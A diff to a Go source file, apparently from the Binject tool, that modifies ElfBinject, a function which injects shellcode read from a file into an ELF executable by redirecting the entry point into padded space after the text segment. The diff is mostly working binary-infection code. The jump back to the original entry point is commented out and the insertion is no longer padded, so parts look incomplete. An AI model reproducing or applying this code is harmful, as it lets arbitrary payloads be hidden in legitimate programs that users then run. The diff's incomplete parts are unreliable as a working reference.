@@ -1,13 +1,19 @@
 package bj
 
 import (
+	"io/ioutil"
 	"log"
 
 	"github.com/Binject/debug/elf"
 )
 
 // ElfBinject - Inject shellcode into an ELF binary
-func ElfBinject(sourceFile string, destFile string, shellcode string, config *BinjectConfig) error {
+func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {
+
+	shellcode, err := ioutil.ReadFile(shellcodeFile)
+	if err != nil {
+		return err
+	}
 
 	elfFile, err := elf.Open(sourceFile)
 	if err != nil {
@@ -32,9 +38,6 @@ func ElfBinject(sourceFile string, destFile string, shellcode string, config *Bi
 				}
 			}
 		}
-	} else {
-		log.Printf("Using New Section Method")
-		log.Printf("Not Implemented yet")
 	}
 	//
 	// END CODE CAVE DETECTION SECTION
@@ -57,20 +60,25 @@ func ElfBinject(sourceFile string, destFile string, shellcode string, config *Bi
 		        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
 					into the file - text segment p_offset + p_filesz (original)
 	*/
-	sc := []byte(shellcode)
-	sclen := uint64(len(sc))
+	sclen := uint64(len(shellcode))
 	PAGE_SIZE := uint64(4096)
 	newOffset := uint64(0)
 
 	// 6. Increase p_shoff by PAGE_SIZE in the ELF header
 	elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)
+
 	// 7. Patch the insertion code (parasite) to jump to the entry point (original)
 	// originalEntry := elfFile.FileHeader.Entry
 
-	// 1. Locate the text segment program header
 	afterTextSegment := false
 	for _, p := range elfFile.Progs {
-		if p.Type == elf.PT_LOAD && p.Flags&(elf.PF_R|elf.PF_X) != 0 {
+
+		if afterTextSegment {
+			//2. For each phdr which is after the insertion (text segment)
+			//-increase p_offset by PAGE_SIZE
+			p.Off += PAGE_SIZE
+		} else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
+			// 1. Locate the text segment program header
 			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
 			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
 			// -Increase p_filesz to account for the new code (parasite)
@@ -80,10 +88,6 @@ func ElfBinject(sourceFile string, destFile string, shellcode string, config *Bi
 
 			newOffset = p.Off + p.Filesz
 			afterTextSegment = true
-		} else if afterTextSegment {
-			//2. For each phdr which is after the insertion (text segment)
-			//-increase p_offset by PAGE_SIZE
-			p.Off += PAGE_SIZE
 		}
 	}
 
@@ -101,9 +105,7 @@ func ElfBinject(sourceFile string, destFile string, shellcode string, config *Bi
 
 	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
 	//	into the file - text segment p_offset + p_filesz (original)
-	insert := make([]byte, PAGE_SIZE)
-	copy(insert, sc)
-	elfFile.Insertion = insert
+	elfFile.Insertion = shellcode
 
 	return elfFile.Write(destFile)
 }
